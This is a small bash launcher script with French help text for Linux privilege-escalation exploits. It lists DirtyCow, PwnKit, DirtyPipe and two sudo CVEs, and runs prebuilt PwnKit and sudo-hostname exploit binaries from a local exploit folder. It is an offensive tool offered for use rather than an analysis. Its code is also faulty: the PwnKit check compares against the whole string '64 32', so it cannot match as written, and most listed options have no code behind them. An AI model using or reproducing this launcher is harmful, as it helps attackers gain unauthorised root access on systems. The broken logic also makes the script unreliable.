#!/bin/bash

arch="64 32"

if [[ "$*" == "-help" ]]; then
    echo "Commande :"
    echo "  -DirtyCow      : DirtyCow - CVE-2016-5195"
    echo "  -PwnKit64/32   : PwnKit64/32 - CVE-2021-4034"
    echo "  -DirtyPipe     : DirtyPipe - CVE-2022-0847"
    echo "  -Chroot        : Sudo Chroot - CVE-2025-32463"
    echo "  -SudoHost      : Sudo Hostname - CVE-2025-32462 "
    echo "  -check         : Verifie si gcc est installer"
    exit 0
fi

# PwnKit
if [[ "$*" == "-PwnKit${arch}" ]]; then
    "${PWD}/exploit/PwnKit/PwnKit${arch}"    
fi

# Sudo-Host
if [[ "$*" == "-SudoHost" ]]; then
    "${PWD}/exploit/Sudo-host/exploit"
fi
